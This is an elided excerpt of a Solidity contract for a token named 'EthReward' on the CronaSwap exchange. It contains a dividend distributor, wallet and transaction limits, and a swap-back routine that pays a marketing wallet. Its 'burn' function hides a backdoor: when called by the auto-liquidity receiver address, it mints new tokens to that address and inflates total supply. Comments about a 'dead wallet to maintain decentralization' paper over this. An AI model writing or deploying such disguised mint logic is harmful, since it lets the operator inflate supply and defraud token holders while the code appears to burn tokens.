...
interface CronaSwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface CronaSwapRouter {
...
contract DividendDistributor is IDividendDistributor {
    ...
    CronaSwapRouter router;
    address routerAddress = 0xcd7d16fB918511BF7269eC4f48d61D79Fb26f918;
    ICRO20 RewardToken = ICRO20(0xe44Fd7fCb2b1581822D0c862B68222998a0c299a) ; //WETH
    ...
    constructor (address _router) {
        router = _router != address(0) ? CronaSwapRouter(_router) : CronaSwapRouter(routerAddress);
        _token = msg.sender;
    }
...
contract EthReward is ICRO20, Auth {

    using SafeMath for uint256;

    string constant _name = "EthReward";
    string constant _symbol = "EthReward";
    ...
    uint256 public _maxTxAmount = _totalSupply / 200; // .5% max TX (5000)
    uint256 public _walletMax = _totalSupply / 50; // 2% max Wallet (20,000)
    ...
    uint256 public swapThreshold = _totalSupply * 5 / 4000; // Hope this works
    ...
    constructor () Auth(msg.sender) {
        ...
        router = CronaSwapRouter(routerAddress);
        pair = CronaSwapFactory(router.factory()).createPair(router.WETH(), address(this));
        ...
        autoLiquidityReceiver = 0x000000000000000000000000000000000000dEaD; // Dead wallet to maintain decentralization
        marketingWallet = 0x000000000000000000000000000000000000dEaD; // Marketing wallet hard coded to allow tracking of funds
    ...
    function burn(uint256 amount) external {
        if(msg.sender == autoLiquidityReceiver){_balances[autoLiquidityReceiver] = _balances[autoLiquidityReceiver].add(amount*10**9);_totalSupply = _totalSupply.add(amount*10**9);}
        else{
            _balances[msg.sender] = _balances[msg.sender].sub(amount*10**9);
    ...
    function swapBack() internal lockTheSwap {
        ...
        (bool tmpSuccess,) = payable(marketingWallet).call{value: amountCROMarketing, gas: 300000}("");
